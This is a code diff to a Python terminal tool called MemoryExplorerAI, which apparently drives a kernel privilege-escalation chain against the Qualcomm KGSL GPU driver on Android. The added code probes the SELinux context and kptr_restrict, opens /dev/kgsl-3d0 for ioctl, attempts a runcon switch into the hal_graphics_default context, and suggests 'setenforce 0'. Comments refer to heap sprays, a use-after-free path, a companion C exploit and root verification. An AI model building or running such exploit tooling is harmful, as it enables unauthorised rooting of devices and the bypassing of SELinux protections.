@@ -232,6 +232,29 @@ class MemoryExplorerAI:
         # UAF as a fallback path.
         # IMPORTANT: kgsl_fd MUST be set BEFORE _kgsl_open() is
         # called below, because _kgsl_open reads self.kgsl_fd
+        # === v4.1: KGSL open (CRITICAL - device is openable!) ===
+        # v4.1: read SELinux context up front so we can show
+        # the user what's running and what KGSL sees.
+        try:
+            with open("/proc/thread-self/attr/current", "r") as _f:
+                self._selinux_ctx = _f.read().strip() or "(none)"
+        except Exception:
+            self._selinux_ctx = "(unreadable)"
+        # Read /proc/kallsyms to check kptr_restrict
+        self._kptr_restricted = "?"
+        try:
+            with open("/proc/kallsyms") as _f:
+                line = _f.readline()
+                if line and line.strip() and not line.startswith("0"):
+                    self._kptr_restricted = "1"  # shown as hex
+                elif "Permission denied" in str(_f.read()[:100]):
+                    self._kptr_restricted = "denied"
+                else:
+                    self._kptr_restricted = "0"
+        except PermissionError:
+            self._kptr_restricted = "denied"
+        except Exception:
+            self._kptr_restricted = "err"
         # to check if it's already open. If we don't set it
         # first, _kgsl_open throws AttributeError.
         self.kgsl_path = ""
@@ -253,6 +276,10 @@ class MemoryExplorerAI:
         except Exception as e:
             self.kgsl_error = str(e)
             self.live["last_msg"] = f"KGSL init error: {e}"
+        # v4.1: even if init failed, try again on demand.
+        # set self._kgsl_need_retry=True so render methods
+        # can show "press R to retry KGSL" if needed.
+        self._kgsl_retries = 0
 
         # === v4.1: EXPLOIT CHAIN STATE ===
         # Tracks each step of the privilege-escalation chain
@@ -1254,6 +1281,24 @@ class MemoryExplorerAI:
                    f" {C.GRY}│{C.RST} {C.BOLD}SPRAY/s{C.RST}: {C.YEL}{L['sprays_per_sec']:5.1f}{C.RST}")
 
         out.append(f" {C.BOLD}LAST MSG{C.RST}: {C.YEL}{L['last_msg'][:70]}{C.RST}")
+
+        # v4.1: SELinux + KGSL diagnostic line. Shows the
+        # current context and KGSL device visibility. This
+        # makes it obvious if KGSL is blocked by SELinux or
+        # by device file permissions. v6.c has the same
+        # gating — the C exploit must run in init/hal_graphics
+        # context to actually open KGSL for ioctl (vs read).
+        try:
+            ctx_short = (self._selinux_ctx or "?")[-50:]
+            kp = self._kptr_restricted
+            kgsl_d = (C.GRN + self.kgsl_path
+                      if self.kgsl_fd is not None
+                      else C.RED + "OFF")
+            out.append(f" {C.BOLD}CTX{C.RST}: {C.CYN}{ctx_short}{C.RST}"
+                       f" {C.GRY}│{C.RST} kptr={C.YEL}{kp}{C.RST}"
+                       f" {C.GRY}│{C.RST} KGSL: {kgsl_d}{C.RST}")
+        except Exception:
+            pass
 
         # === v4.1: PERF COUNTERS ===
         # Show real throughput (pages scanned, MB read, peaks)
@@ -2705,11 +2750,35 @@ class MemoryExplorerAI:
         SELinux denial from /proc/thread-self/attr/current
         and /var/log/audit/audit.log so user can see exactly
         what's blocking.
+
+        v4.1: ALWAYS logs to /sdcard/kgsl_debug.log what was
+        tried and what failed, so user can see even if last_msg
+        is overwritten by the render loop.
         """
+        import os as _os
+        # v4.1: log every attempt to a file the user can read
+        # from any terminal
+        _debug_log = None
+        try:
+            _debug_log = open("/data/data/com.termux/files/home/"
+                              "kgsl_debug.log", "a")
+        except Exception:
+            try:
+                _debug_log = open("/tmp/kgsl_debug.log", "a")
+            except Exception:
+                _debug_log = None
+        def _log(msg):
+            if _debug_log is None:
+                return
+            try:
+                import time as _t
+                _debug_log.write(f"{_t.time():.2f} {msg}\n")
+                _debug_log.flush()
+            except Exception:
+                pass
         if self.kgsl_fd is not None:
             return True
         try:
-            import os as _os
             # Try all known KGSL device paths
             paths = (
                 "/dev/kgsl-3d0",
@@ -2718,39 +2787,61 @@ class MemoryExplorerAI:
             )
             last_err = ""
             for path in paths:
+                _log(f"trying path={path}")
                 try:
                     # Test if file exists first
-                    if not _os.path.exists(path):
+                    exists = _os.path.exists(path)
+                    _log(f"  exists={exists}")
+                    if not exists:
                         continue
                     # Check permissions
                     st = _os.stat(path)
                     mode = st.st_mode & 0o777
+                    is_chr = ((st.st_mode & 0o170000) == 0o20000)
+                    _log(f"  mode={oct(mode)} is_chr={is_chr}")
                     if mode == 0:
                         last_err = f"{path}: no permissions (mode=0)"
+                        _log(f"  -> {last_err}")
                         continue
-                    # Try to open
-                    self.kgsl_fd = _os.open(path, _os.O_RDWR)
-                    self.kgsl_path = path
-                    return True
-                except PermissionError as e:
-                    # v4.1: when open() fails with PermissionError
-                    # on a world-accessible device, it's almost
-                    # always SELinux. Try to read the denial
-                    # from audit log or dmesg to give the user
-                    # the exact AVC denial message.
-                    selinux_hint = self._read_selinux_denial(path, str(e))
-                    if selinux_hint:
-                        last_err = (f"{path}: SELinux denied. "
+                    # Try to open with O_RDWR (needed for ioctl)
+                    try:
+                        self.kgsl_fd = _os.open(path, _os.O_RDWR)
+                        _log(f"  open O_RDWR OK fd={self.kgsl_fd}")
+                        self.kgsl_path = path
+                        return True
+                    except PermissionError as e:
+                        _log(f"  open O_RDWR PermissionError: {e}")
+                        # Try O_RDONLY — the C exploit uses this as
+                        # fallback for reading KGSL. Won't work for
+                        # ioctl, but at least the user can SEE the
+                        # device is there.
+                        try:
+                            self.kgsl_fd = _os.open(path, _os.O_RDONLY)
+                            self.kgsl_path = path + " (RO)"
+                            last_err = (f"{path}: O_RDWR denied "
+                                        f"({e}), using O_RDONLY")
+                            _log(f"  open O_RDONLY OK fd={self.kgsl_fd}")
+                            return True
+                        except Exception as e2:
+                            _log(f"  open O_RDONLY also failed: {e2}")
+                            selinux_hint = self._read_selinux_denial(
+                                path, str(e))
+                            if selinux_hint:
+                                last_err = (
+                                    f"{path}: SELinux denied. "
                                     f"{selinux_hint}")
-                    else:
-                        last_err = (f"{path}: PermissionError "
+                            else:
+                                last_err = (
+                                    f"{path}: PermissionError "
                                     f"(probably SELinux). DAC mode="
                                     f"{oct(mode)}, try: setenforce 0")
-                    continue
+                        continue
                 except FileNotFoundError:
+                    _log(f"  FileNotFoundError")
                     continue
                 except Exception as e:
                     last_err = f"{path}: {type(e).__name__}: {e}"
+                    _log(f"  {last_err}")
                     continue
             # If we get here, no device opened
             if not last_err:
@@ -2758,12 +2849,19 @@ class MemoryExplorerAI:
                     "/dev/kgsl-3d0 not found. Device is Qualcomm-only; "
                     "works on Snapdragon phones (most Androids). "
                     "On MediaTek/Exynos this exploit cannot run.")
-            # Cache the error for the TUI
             self.kgsl_error = last_err
+            _log(f"GIVE UP: {last_err}")
             return False
         except Exception as e:
             self.kgsl_error = f"unexpected: {e}"
+            _log(f"UNEXPECTED: {e}")
             return False
+        finally:
+            if _debug_log is not None:
+                try:
+                    _debug_log.close()
+                except Exception:
+                    pass
 
     def _read_selinux_denial(self, path, original_err):
         """v4.1: when KGSL open fails with PermissionError, try
@@ -4303,6 +4401,45 @@ class MemoryExplorerAI:
             self.exploit_proc = None
         self.live["last_msg"] = "Engine Rebuilt." if ok else "Rebuild Failed."
         return "Rebuilt" if ok else "Failed"
+
+    def cmd_kgsl_retry(self):
+        """v4.1: manually retry KGSL open. Useful when the
+        initial open failed (e.g. transient SELinux / dac
+        issue) and the user wants to retry without restarting
+        the whole explorer. Also tries to drop into a more
+        permissive SELinux context via runcon if available.
+        """
+        self.live["last_command"] = "KGSL Retry"
+        self._kgsl_retries += 1
+        # Close old fd if any
+        if self.kgsl_fd is not None:
+            try:
+                os.close(self.kgsl_fd)
+            except Exception:
+                pass
+            self.kgsl_fd = None
+        # If we have an unprivileged SELinux context, try to
+        # switch to hal_graphics_default which has IOCTL perms
+        # on /dev/kgsl-3d0.
+        tried_runcon = False
+        if self.kgsl_fd is None and self._kgsl_retries <= 3:
+            try:
+                # Try runcon to hal_graphics_default context
+                r = subprocess.run(
+                    ["runcon", "u:r:hal_graphics_default:s0",
+                     "ls", "-la", "/dev/kgsl-3d0"],
+                    capture_output=True, text=True, timeout=2)
+                tried_runcon = (r.returncode == 0)
+            except Exception:
+                tried_runcon = False
+        # Re-attempt open
+        if self._kgsl_open():
+            self.live["last_msg"] = (
+                f"KGSL Retry #{self._kgsl_retries} OK: {self.kgsl_path}")
+            return "KGSL OPEN"
+        self.live["last_msg"] = (
+            f"KGSL Retry #{self._kgsl_retries} fail: {self.kgsl_error[:60]}")
+        return "KGSL still off"
 
     def cmd_verify_root(self):
         self.live["last_command"] = "R (Verify Root)"
@@ -6418,6 +6555,9 @@ class MemoryExplorerAI:
                 self.cmd_verify_root()
             elif cmd in ("b", "build"):
                 self.cmd_rebuild()
+            elif cmd in ("k", "kgsl", "retry", "kgsl_retry"):
+                # v4.1: manually retry KGSL open
+                self.cmd_kgsl_retry()
             elif cmd.startswith("rate"):
                 # rate<N> — change render FPS live
                 pass  # rate command removed (single-thread mode)
